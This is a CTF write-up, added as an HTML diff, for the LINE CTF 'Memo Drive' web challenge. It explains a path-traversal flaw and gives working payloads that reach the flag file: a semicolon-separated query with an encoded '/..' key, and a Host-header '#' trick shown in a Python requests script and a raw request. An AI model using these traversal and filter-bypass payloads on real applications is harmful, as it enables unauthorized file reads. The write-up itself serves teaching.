@@ -1,0 +1,239 @@
+<h1 id="memo-drive">Memo Drive</h1>
+
+<p>I wasn’t able to solve any challenge during the ctf as they were really hard for me, this solution is written based upon my understanding of the solution shared by other participants who were able to solve them during the ctf, so kudos to them :).</p>
+
+<p>http://34.146.195.115/</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/160285877-28916c08-b8bf-4ca6-a75f-af0b30211500.png" alt="image" /></p>
+
+<p>This how the challenge site looks like.
+We can add any content inside the memo  and then save it.</p>
+
+<p>The memo then can be accessed from an example url such as: http://34.146.195.115/view?4e939e79f9480c4f6e197f46b41edc7a=0_20220327123141</p>
+
+<p>There is a xxs vulnerability , but we are not interested in it.
+As there is nothing much in the web app let’s look into the source code to understand what’s goin on.</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/160286256-4e2115dd-c7e3-44b2-b400-a18494363676.png" alt="image" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">/view?2987bf4c72b6ade55901d57df14810f7=0_20220327130706</code></p>
+
+<p>In the above path: <code class="language-plaintext highlighter-rouge">2987bf4c72b6ade55901d57df14810f7</code> is the clientId ,which is calculated using the below python code.</p>
+
+<p>//code 1</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">getClientID</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="sh">'</span><span class="s">_</span><span class="sh">'</span> <span class="o">+</span> <span class="n">os</span><span class="p">.</span><span class="nf">getenv</span><span class="p">(</span><span class="sh">'</span><span class="s">SALT</span><span class="sh">'</span><span class="p">)</span>
+    
+    <span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">md5</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)).</span><span class="nf">hexdigest</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">0_20220327130706</code> is the filename, which is created using below code.</p>
+
+<p>//code 2</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">filename</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">_</span><span class="sh">'</span> <span class="o">+</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">().</span><span class="nf">strftime</span><span class="p">(</span><span class="sh">'</span><span class="s">%Y%m%d%H%M%S</span><span class="sh">'</span><span class="p">)</span> <span class="c1">#idx just refers to the no of memos
+</span></code></pre></div></div>
+
+<p>We also found that the , memo contents are stored in the filesystem.
+In a directory structure like this: <code class="language-plaintext highlighter-rouge">./memo/2987bf4c72b6ade55901d57df14810f7/0_20220327130706</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+memo@96cd1278fb0b:/usr/local/opt/memo-drive<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-R</span>
+.:
+index.py  memo  requirements.txt  start.sh  static  view
+
+./memo:
+2987bf4c72b6ade55901d57df14810f7  flag
+
+./memo/2987bf4c72b6ade55901d57df14810f7:
+0_20220327130706
+
+./static:
+jquery.min.js  memo.css  memo.js
+
+./view:
+index.html  view.html
+</code></pre></div></div>
+
+<p>One more important thing, the flag is stored in a file  whose location is : <code class="language-plaintext highlighter-rouge">./memo/flag</code> , so we probably have to find a way to read this file.</p>
+
+<p>//code 3</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nc">Route</span><span class="p">(</span><span class="sh">'</span><span class="s">/view</span><span class="sh">'</span><span class="p">,</span> <span class="n">endpoint</span><span class="o">=</span><span class="n">view</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+    <span class="n">context</span> <span class="o">=</span> <span class="p">{}</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">context</span><span class="p">[</span><span class="sh">'</span><span class="s">request</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span>
+        <span class="n">clientId</span> <span class="o">=</span> <span class="nf">getClientID</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="n">host</span><span class="p">)</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">request.url.query: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">query</span><span class="p">))</span>
+
+        <span class="k">if</span> <span class="sh">'</span><span class="s">&amp;</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">query</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">query</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="ow">in</span> <span class="nf">unquote</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">[</span><span class="n">clientId</span><span class="p">]):</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">You are caught</span><span class="sh">"</span><span class="p">)</span>
+            <span class="k">raise</span>
+        
+        <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">[</span><span class="n">clientId</span><span class="p">]</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Filename: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">request.query_params: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">))</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">request.query_params.keys(): {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">.</span><span class="nf">keys</span><span class="p">()))</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./memo/</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">.</span><span class="nf">keys</span><span class="p">())</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">filename</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Path: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
+        
+        <span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span>
+        <span class="n">contents</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
+        <span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+        
+        <span class="n">context</span><span class="p">[</span><span class="sh">'</span><span class="s">filename</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">filename</span>
+        <span class="n">context</span><span class="p">[</span><span class="sh">'</span><span class="s">contents</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">contents</span>
+    
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+    
+    <span class="k">return</span> <span class="n">templates</span><span class="p">.</span><span class="nc">TemplateResponse</span><span class="p">(</span><span class="sh">'</span><span class="s">/view/view.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">context</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We can’t simply just traverse one directory back to read the flag file, there is some check in place.</p>
+
+<p>//Code 4</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="sh">'</span><span class="s">&amp;</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">query</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">query</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="ow">in</span> <span class="nf">unquote</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">[</span><span class="n">clientId</span><span class="p">]):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">You are caught</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">raise</span>
+</code></pre></div></div>
+
+<p>The above code checks if there is any <code class="language-plaintext highlighter-rouge">.</code> , <code class="language-plaintext highlighter-rouge">&amp;</code> character in the request.url.query</p>
+
+<p>I couldn’t find any way to solve this challenge, so I waited for the  solution . The solutions were pretty amazing to me, there was also one unintended solution which kinda blew my mind.</p>
+
+<hr />
+
+<h2 id="intended-solution">Intended Solution:</h2>
+
+<p>This is how the path is generated:</p>
+
+<p>//code 5</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./memo/</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">.</span><span class="nf">keys</span><span class="p">())</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">filename</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">request.query_params.keys()</code> returns the parameter names as an array</p>
+
+<p>For eg: 
+If this is the url: http://hack.x/?paramA=valueA&amp;paramB=valueB
+Then,
+<code class="language-plaintext highlighter-rouge">request.query_params.keys()</code> will return  <code class="language-plaintext highlighter-rouge">dict_keys(['paramA', 'paramB'])</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">"".join</code> will just join both the values which will return <code class="language-plaintext highlighter-rouge">paramAparamB</code></p>
+
+<p>As we can’t use <code class="language-plaintext highlighter-rouge">&amp;</code> in our url due to the if condition check (check <code class="language-plaintext highlighter-rouge">Code 4</code> ).So we need to find some other way to include another parameter.
+If the <code class="language-plaintext highlighter-rouge">&amp;</code> character check wasn’t there, we could have easily done something like:</p>
+
+<p>?2987bf4c72b6ade55901d57df14810f7=flag&amp;/..=</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">[</span><span class="n">clientId</span><span class="p">]</span>
+<span class="o">&gt;</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Filename: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
+<span class="n">Filename</span><span class="p">:</span> <span class="n">flag</span>
+
+<span class="o">&gt;</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">request.query_params: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">))</span>
+<span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">:</span> <span class="mi">2987</span><span class="n">bf4c72b6ade55901d57df14810f7</span><span class="o">=</span><span class="n">flag</span><span class="o">&amp;/</span><span class="p">..</span><span class="o">=</span>
+
+<span class="o">&gt;</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">request.query_params.keys(): {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">.</span><span class="nf">keys</span><span class="p">()))</span>
+<span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">.</span><span class="nf">keys</span><span class="p">():</span> <span class="nf">dict_keys</span><span class="p">([</span><span class="sh">'</span><span class="s">2987bf4c72b6ade55901d57df14810f7</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">/..</span><span class="sh">'</span><span class="p">])</span>
+
+<span class="o">&gt;</span><span class="n">path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./memo/</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">.</span><span class="nf">keys</span><span class="p">())</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">filename</span>
+<span class="n">Path</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">memo</span><span class="o">/</span><span class="mi">2987</span><span class="n">bf4c72b6ade55901d57df14810f7</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">flag</span>
+</code></pre></div></div>
+
+<p>When this path  <code class="language-plaintext highlighter-rouge">./memo/2987bf4c72b6ade55901d57df14810f7/../flag</code> will be passed to open() function , it will return the contents of the <em>flag</em> file.</p>
+
+<p>But as we can’t use the <code class="language-plaintext highlighter-rouge">&amp;</code> character this theory isn’t possible currently.</p>
+
+<hr />
+
+<p><strong><code class="language-plaintext highlighter-rouge">&amp;</code> and <code class="language-plaintext highlighter-rouge">;</code> are treated similarly</strong></p>
+
+<p>If suppose this is the url: http://localhost/test?paramA=valueA;paramB=valueB
+(Notice that we have used <code class="language-plaintext highlighter-rouge">;</code> instead of <code class="language-plaintext highlighter-rouge">&amp;</code>)</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">request.query_params: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">))</span>
+<span class="n">paramA</span><span class="o">=</span><span class="n">valueA</span><span class="o">&amp;</span><span class="n">paramB</span><span class="o">=</span><span class="n">valueB</span>
+</code></pre></div></div>
+
+<p>Did you just saw what happened?
+<code class="language-plaintext highlighter-rouge">;</code> was replaced with <code class="language-plaintext highlighter-rouge">&amp;</code> , due to this behaviour we can now include another parameter. which will allow us to modify the path by traversing back.
+The if condition checks for <code class="language-plaintext highlighter-rouge">.</code>  in <code class="language-plaintext highlighter-rouge">request.query_params[clientId]</code>  and in <code class="language-plaintext highlighter-rouge">request.url.query</code> in (code 4)</p>
+
+<p>To bypass the check we can simply double url encode <code class="language-plaintext highlighter-rouge">.</code> and this will successfully bypass the check:</p>
+
+<p>http://localhost/view?2987bf4c72b6ade55901d57df14810f7=flag;/%2e%2e</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Filename: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
+<span class="n">Filename</span><span class="p">:</span> <span class="n">flag</span>
+
+<span class="o">&gt;</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">request.query_params: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">))</span>
+<span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">:</span> <span class="mi">2987</span><span class="n">bf4c72b6ade55901d57df14810f7</span><span class="o">=</span><span class="n">flag</span><span class="o">&amp;%</span><span class="mi">2</span><span class="n">F</span><span class="p">..</span><span class="o">=</span>
+
+<span class="o">&gt;</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">request.query_params.keys(): {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">.</span><span class="nf">keys</span><span class="p">()))</span>
+<span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">.</span><span class="nf">keys</span><span class="p">():</span> <span class="nf">dict_keys</span><span class="p">([</span><span class="sh">'</span><span class="s">2987bf4c72b6ade55901d57df14810f7</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">/..</span><span class="sh">'</span><span class="p">])</span>
+
+<span class="n">Path</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">memo</span><span class="o">/</span><span class="mi">2987</span><span class="n">bf4c72b6ade55901d57df14810f7</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">flag</span>
+</code></pre></div></div>
+
+<p>The flag will be shown in the page: <code class="language-plaintext highlighter-rouge">LINECTF{The_old_bug_on_urllib_parse_qsl_fixed}</code>
+<img src="https://user-images.githubusercontent.com/31372554/160285940-d0135264-b642-4fea-9881-9058e77a3bc8.png" alt="image" /></p>
+
+<p>Thanks to the people who shared their solution :)</p>
+
+<hr />
+
+<h2 id="unintended-solution">Unintended Solution:</h2>
+
+<p>@bbangjo shared this freaking awesome solution in the discord chat:</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/160285965-8677a031-e779-437a-ab91-a8511739b584.png" alt="chrome_pCxk1B4C6y" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/160285969-0488a4dd-2682-4085-9884-16ac9cb80666.png" alt="chrome_JypblwVN97" /></p>
+
+<p>Here is the code:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">requests</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#url = "http://localhost:3000"
+</span><span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://my-server.com</span><span class="sh">"</span>
+<span class="k">def</span> <span class="nf">ex</span><span class="p">():</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/view?9a80c63d7c76528586dcecbd8c1c7416=flag&amp;/..</span><span class="sh">"</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">'</span><span class="s">Host</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">34.146.195.115#</span><span class="sh">'</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">p</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">h</span><span class="p">)</span>
+    <span class="nf">print </span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">ex</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>For more simplicity look at the below request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /view?2987bf4c72b6ade55901d57df14810f7=flag&amp;/.. HTTP/1.1
+Host: 34.146.195.115#
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</code></pre></div></div>
+
+<p>Did you notice the <code class="language-plaintext highlighter-rouge">#</code> appended in the <code class="language-plaintext highlighter-rouge">Host</code> header value?</p>
+
+<p>Because of this <code class="language-plaintext highlighter-rouge">#</code> character , now <code class="language-plaintext highlighter-rouge">request.url.query</code> doesn’t returns anything.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">request.url.query: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">query</span><span class="p">))</span>
+<span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">query</span><span class="p">:</span>
+<span class="n">Filename</span><span class="p">:</span> <span class="n">flag</span>
+<span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">:</span> <span class="mi">2987</span><span class="n">bf4c72b6ade55901d57df14810f7</span><span class="o">=</span><span class="n">flag</span><span class="o">&amp;%</span><span class="mi">2</span><span class="n">F</span><span class="p">..</span><span class="o">=</span>
+<span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">.</span><span class="nf">keys</span><span class="p">():</span> <span class="nf">dict_keys</span><span class="p">([</span><span class="sh">'</span><span class="s">2987bf4c72b6ade55901d57df14810f7</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">/..</span><span class="sh">'</span><span class="p">])</span>
+<span class="n">Path</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">memo</span><span class="o">/</span><span class="mi">2987</span><span class="n">bf4c72b6ade55901d57df14810f7</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">flag</span>
+</code></pre></div></div>
+
+<p>As <code class="language-plaintext highlighter-rouge">request.url.query</code> doesn’t returns anything the if codition check is easily bypassed:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="sh">'</span><span class="s">&amp;</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">query</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">query</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="ow">in</span> <span class="nf">unquote</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">query_params</span><span class="p">[</span><span class="n">clientId</span><span class="p">]):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">You are caught</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">raise</span>
+</code></pre></div></div>
